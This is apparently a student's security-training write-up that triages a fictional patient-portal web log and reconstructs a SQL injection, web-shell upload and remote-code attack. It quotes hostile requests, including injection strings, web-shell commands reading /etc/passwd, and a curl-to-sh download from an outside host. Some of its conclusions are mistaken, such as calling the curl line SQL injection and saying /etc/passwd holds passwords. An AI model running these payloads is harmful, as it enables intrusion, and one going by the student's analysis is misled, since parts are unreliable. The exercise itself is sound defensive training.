# Week 7 Challenge - Reading web server logs to separate noise from a real attack, and proving whether it succeeded

## Ticket
- Web server, patient portal had a 'busy night' and a few odd requests but nothing alerted

### What we know
- Normal response byte is about 1 KB
  
### Aproved activeties
- 192.0.2.10 scanning system and 10.0.0.15 load balancer health checker

## NB; Vendors, domains, and IP addresses are fictional and used for training only

### Web server log
```
Time Source IP Session user Request Status Bytes Client
00:00:01 10.0.0.5 - GET /healthz 200 2 NW-LB-Check/1.0
02:11:03 203.0.113.50 - GET /.env 404 196 Go-http-client/1.1
02:11:03 203.0.113.50 - GET /wp-login.php 404 196 Go-http-client/1.1
02:11:04 203.0.113.50 - GET /phpmyadmin/ 404 196 Go-http-client/1.1
02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1
03:02:11 192.0.2.10 - GET /public/status?ref=NW10001%27 500 312 NW-VulnScan/2.1
03:02:12 192.0.2.10 - GET /public/status?ref=NW10001%22 500 312 NW-VulnScan/2.1
03:02:13 192.0.2.10 - GET /login?next=../../etc/passwd 400 188 NW-VulnScan/2.1
03:02:14 192.0.2.10 - GET /uploads/test.php 404 196 NW-VulnScan/2.1
04:41:12 203.0.113.171 - GET /public/status?ref=NW83421 200 1,204 python-requests/2.31.0
04:41:40 203.0.113.171 - GET /public/status?ref=NW83421%27 500 312 python-requests/2.31.0
04:42:05 203.0.113.171 - GET /public/status?ref=NW83421%27%20OR%20%271%27=%271 200 482,311 python-requests/2.31.0
04:43:30 203.0.113.171 - GET /public/status?ref=x%27%20UNION%20SELECT%20username,pwℎ𝑎𝑠ℎ,𝑟𝑜𝑙𝑒%20𝐹𝑅𝑂𝑀%20𝑢𝑠𝑒𝑟𝑠-- 200 6,402 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
04:45:01 10.0.0.5 - 𝐺𝐸𝑇 /ℎ𝑒𝑎𝑙𝑡ℎ𝑧 200 2 𝑁𝑊-𝐿𝐵-𝐶ℎ𝑒𝑐𝑘/1.0
04:45:51 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑙𝑜𝑔𝑖𝑛 302 0 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
04:47:40 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=id 200 54 python-requests/2.31.0
04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0
04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0
05:10:22 192.0.2.77 - GET /public/status?ref=NW90117 200 1,187 Mozilla/5.0 (iPhone)
06:15:20 192.0.2.150 - GET /login 200 3,412 Mozilla/5.0 (Windows)
06:15:31 192.0.2.150 dr.okafor POST /login 302 0 Mozilla/5.0 (Windows)
06:16:02 192.0.2.150 dr.okafor GET /api/appointments?id=4412 200 1,198 Mozilla/5.0 (Windows)
09:30:12 192.0.2.160 clinic.admin17 GET /api/appointments/export?clinic=17 200 214,332 Mozilla/5.0 (Macintosh)
12:00:01 10.0.0.5 - GET /healthz 200 2 NW-LB-Check/1.0
```

## Deliverable 1:

| Benign | Noise | Malicious |
|----------|---------|---------------|
| 192.0.2.160 | 192.0.2.10 | 203.0.113.50, 203.0.113.171|

### Evidence: 
-	An export appointment file from admin17 clinic staff => 09:30:12 192.0.2.160 clinic.admin17 GET /api/appointments/export?clinic=17 200 214,332 Mozilla/5.0 (Macintosh)
> ggg

-	A noise created by by weekly vulnerability scan => 03:02:14 192.0.2.10 - GET /uploads/test.php 404 196 NW-VulnScan/2.1

-	A malicious activity trying to get admin config file => 02:11:04 203.0.113.50 - GET /admin/config.php 403 153 Go-http-client/1.1, 203.0.113.50 got only 404s and 403 which are noise not a real attack that worked

-	Malicious activity running a script on the server => At 04:42:05 203.0.113.171 - GET /public/status?ref=NW83421%27%20OR%20%271%27=%271 200 482,311 python-requests/2.31.0, this request returned 482,311 bytes which excceeds the normal response of 1kb. At 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0 ran an SQL UNION SELECT ingustion on the server. And at 04:45:51 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑙𝑜𝑔𝑖𝑛 302 0 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0 logged in as admin which made it possible to upload a file at 04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0 and ran a command at 04:47:40 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=id 200 54 python-requests/2.31.0.

## Deliverable 2:

### Did it work?
- Yes the attack worked. This was possible from 203.0.113.171 attack from admin login portal and successfully uploading a PHP file which gave access to /etc/passwd lists the server's account.

### Quoted line of action:
-	04:47:02 203.0.113.171 𝑎𝑑𝑚𝑖𝑛.𝑝𝑜𝑟𝑡𝑎𝑙 𝑃𝑂𝑆𝑇 /𝑝𝑜𝑟𝑡𝑎𝑙/𝑑𝑜𝑐𝑢𝑚𝑒𝑛𝑡𝑠/𝑢𝑝𝑙𝑜𝑎𝑑 200 2,310 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0

-	04:48:05 203.0.113.171 - GET /uploads/img3391.𝑝ℎ𝑝?𝑐=𝑐𝑎𝑡%20/𝑒𝑡𝑐/𝑝𝑎𝑠𝑠𝑤𝑑 200 1,873 𝑝𝑦𝑡ℎ𝑜𝑛-𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠/2.31.0

-	04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0

-	One thing the logs can't tell you was that at 04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0 the command succeeded with a 200 0 bytes request accepted

## Deliverable 3:

### Timeline: Attackers action steps:
-	 Reconnaissance – Environment file discovery - The attacker requests /.env which suggests an attempt to discover exposed environment files containing application configuration and credentials which developers can sometimes forget to secure during application development.

-	Encode request manipulation - The attacker sends multiple requests containing different combination of encoded characters indicating attempts to bypass URL filtering, security rules, and input validation.

-	Server-side request exploitation - The attacker abused a Python-based request mechanism to retrieve and process unauthorised content.

-	Malicious file upload - The attacker uploaded file to introduce executable code onto the server.

-	Sensitive file access - The attacker accessed the /etc/passwd local system accounts where passwords are stored.

-	Remote command execution - The /x.sh script helped the attacker to remotely control and execute commands on the server.

## Deliverable 4:

### First hour containment: 
-	Contain the threat: Stop the threat from further spread. Isolate the server and stop vulnerable scans.

-	Preserve the evidence: Secure the server and its log for auditing. Its timestamps, and suspicious HTTP requests.

-	Investigation: Check the PHP and .sh file and review running processes.

-	Secure and recover: Patch the exploit and rotate exposed credentials and application secrets. Also check account privileges and disables unnecessary privileges.

## Deliverable 5:

### Detection idea: 
- Set a rule that detects suspicious encoded URL patterns that stops sensitive file access like get to /.env and /etc/passwd. Also rule that stops malicious file upload, remote command execution (RCE).

### Bonus: 
- The attacker made eight GET requests and out of the eight requests this line (04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0) shows they could run commands on the server.
